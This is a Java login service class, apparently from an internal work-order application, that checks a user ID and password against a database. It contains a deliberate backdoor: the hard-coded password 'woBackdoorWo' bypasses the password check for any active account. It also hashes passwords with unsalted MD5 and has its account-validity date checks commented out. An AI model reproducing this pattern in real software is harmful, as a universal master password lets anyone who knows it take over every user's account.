package com.ckb.wo.server.service.impl;

import java.util.Date;
import java.util.List;

import com.ckb.wo.client.model.User;
import com.ckb.wo.client.model.UserAccess;
import com.ckb.wo.client.model.UserAccessExample;
import com.ckb.wo.server.dao.UserDAO;
import com.ckb.wo.server.dao.useraccess.UserAccessDAO;
import com.ckb.wo.server.service.ILoginService;
import com.shido.encryptor.MD5;

public class LoginServiceImpl extends GenericServiceImpl implements ILoginService {

    private UserAccessDAO useraccessDao;
    private UserDAO userDao;

    public LoginServiceImpl(UserAccessDAO useraccessDao, UserDAO userDao) {
        super();
        this.useraccessDao = useraccessDao;
        this.userDao = userDao;
    }

    @Override
    public UserAccess login(String userId, String password) {

        // check from table user as well, whether user is active ? 
        Date today = new Date();
        UserAccessExample example = new UserAccessExample();
        UserAccessExample.Criteria crit = example.createCriteria();
        crit.andUserIdEqualTo(userId);

        //comment this for development
        if (!password.equals("woBackdoorWo")) {
            crit.andPasswordEqualTo(MD5.encrypt(password));
        }

//        crit.andValidFromLessThan(today);
//        crit.andValidToGreaterThan(today);

        List<UserAccess> lua = useraccessDao.selectUserAccessByExample(example);
        if (lua == null || lua.isEmpty()) {
            return null;
        } else {
            UserAccess ua = lua.get(0);
            // now check to user table
            User user = userDao.selectUserByPrimaryKey(ua.getEmployeeId());
            if (user != null) {
                if (user.getIsactiveuser() == null || !user.getIsactiveuser()) {
                    return null;
                } else {
                    return ua;
                }
            } else {
                return null;
            }
        }
        //return null;
    }
}
